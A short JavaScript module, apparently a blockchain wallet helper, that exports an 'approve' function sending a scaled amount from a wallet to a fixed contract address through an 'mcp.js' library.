import mcp from "mcp.js"
import Big from 'bignumber.js'

export default {
    async approve(wallet, limit){
        const approveAmount = new Big(limit).times('1e18').toString()
        const response = await mcp.request.sendBlock({
            from: wallet,
            to: "0xe05D6eaA0A0302CB0Dad1cb1b3FEC2B9839afe31",
            amount: approveAmount
        })

        return response
    }
}